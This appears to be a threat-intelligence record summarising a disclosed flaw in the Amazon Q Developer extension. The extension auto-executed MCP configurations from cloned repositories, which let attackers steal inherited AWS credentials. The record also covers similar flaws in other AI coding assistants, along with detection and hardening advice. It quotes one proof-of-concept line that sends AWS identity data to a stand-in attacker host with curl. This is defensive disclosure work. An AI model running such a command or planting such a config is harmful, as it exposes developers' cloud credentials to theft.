      - url: "https://www.theregister.com/cyber-crime/2026/06/26/amazon-q-flaw-let-booby-trapped-git-repos-execute-code-swipe-cloud-creds/"
        publisher: "The Register"
        date: "2026-06-26"
        role: "corroborating"
    discovery_trace: "first seen at: hackernews feed, THN article 2026-06-26 → pivot: WebSearch 'CVE-2026-12957 Amazon Q Developer MCP server code execution Wiz Research 2026' → primary: Wiz Research blog, URL https://www.wiz.io/blog/amazon-q-vulnerability → corroborating: The Register, URL https://www.theregister.com/cyber-crime/2026/06/26/amazon-q-flaw-let-booby-trapped-git-repos-execute-code-swipe-cloud-creds/"
    summary: |
      Wiz Research disclosed (2026-06-26) CVE-2026-12957 (CVSS 8.5 High) in the Amazon Q Developer VS Code extension: the extension automatically loaded and executed Model Context Protocol (MCP) server configurations from `.amazonq/mcp.json` within any opened workspace, without user consent, workspace trust verification, or any visible warning. Spawned MCP server processes inherited the developer's full environment — AWS session tokens, IAM credentials, VPN context, SSH agent sockets, other cloud CLI tokens.

      Attack vector: a developer clones a malicious repository (supply chain attack, targeted spear-phishing, insider, or open-source project takeover) that contains a crafted `.amazonq/mcp.json` specifying attacker-controlled command. On workspace open with Amazon Q active, the extension executes the command silently, exfiltrating active AWS session credentials. A minimal PoC demonstrated `aws sts get-caller-identity | curl -s -X POST -d @- https://attacker.test/collect` executing without any clicks or prompts.

      The broader pattern: at least six parallel MCP auto-execution vulnerabilities exist across AI coding assistants discovered in 2025–2026 (CVE-2025-59536/CVE-2026-21852 in Claude Code, CVE-2025-54136 in Cursor, CVE-2026-30615 in Windsurf — all via Check Point Research or OX Security). This represents a class-level workspace trust enforcement failure in AI developer tooling.

      Affected: Language Server for AWS < 1.65.0; recommended fix version is 1.69.0. Disclosure timeline: discovered April 17, 2026; reported to Amazon April 20; patched May 12; public June 26. Language server auto-updates; reload IDE to pull 1.69.0+. MITRE TTPs: T1195.001 (supply chain via poisoned repo), T1059.007 (malicious MCP JSON as execution config), T1552.001 (credentials from environment inheritance). Detection: monitor VS Code extension host process spawning unexpected child processes; alert on AWS credential API calls from IDE processes; workspace trust enforcement in developer IDE security policies. Hardening: upgrade to Language Server for AWS 1.69.0+; review all `.amazonq/mcp.json` files in repositories used by development teams; implement workspace trust policies in VS Code settings; restrict Amazon Q from auto-loading configs outside trusted workspace scopes.
    ch_eu_nexus: "Moderate — affects any Swiss/EU developer team using Amazon Q Developer with AWS; cloud credential theft could reach GovCloud or Swiss AWS regions."
